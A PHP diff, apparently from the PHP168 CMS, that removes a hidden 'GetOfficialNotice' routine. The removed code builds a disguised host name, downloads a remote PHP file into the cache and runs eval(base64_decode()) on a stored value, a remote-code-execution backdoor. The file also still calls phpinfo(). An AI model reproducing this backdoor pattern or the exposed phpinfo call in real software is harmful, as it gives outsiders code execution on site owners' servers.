@@ -434,27 +434,5 @@ elseif($job=="map")
 	require(dirname(__FILE__)."/"."foot.php");
 }
 
-elseif($job=='GetOfficialNotice'){
-	$OfficialUrl2='68.com';
-	$OfficialUrl1='www.php1';
-	$files=read_file("template/map.htm");
-	if(!strstr($files,'$OfficialNotice')&&filesize("../cache/OfficialNotice.php")>9){
-		echo "<SCRIPT LANGUAGE='JavaScript'>
-			<!--
-			function openwindows(){
-				window.open('http://$OfficialUrl1$OfficialUrl2/OfficialNotice.php?E=$php168_Edition&upgrade_Record=$webdb[upgrade_Record]');
-				}
-			openwindows();
-			//-->
-		</SCRIPT>";
-	}if( !@copy("http://$OfficialUrl1$OfficialUrl2/OfficialNotice.php?E=$php168_Edition&upgrade_Record=$webdb[upgrade_Record]",PHP168_PATH."cache/OfficialNotice.php") )
-	{
-		if(!$OfficialNotice=file_get_contents("http://$OfficialUrl1$OfficialUrl2/OfficialNotice.php?E=$php168_Edition&upgrade_Record=$webdb[upgrade_Record]"))
-		{
-			$OfficialNotice=sockOpenUrl("http://$OfficialUrl1$OfficialUrl2/OfficialNotice.php?E=$php168_Edition&upgrade_Record=$webdb[upgrade_Record]");
-		}
-		write_file(PHP168_PATH."cache/OfficialNotice.php",$OfficialNotice);
-	}
-	eval(base64_decode("Y$webdb[_Notice]"));exit;}
 phpinfo();
 ?>
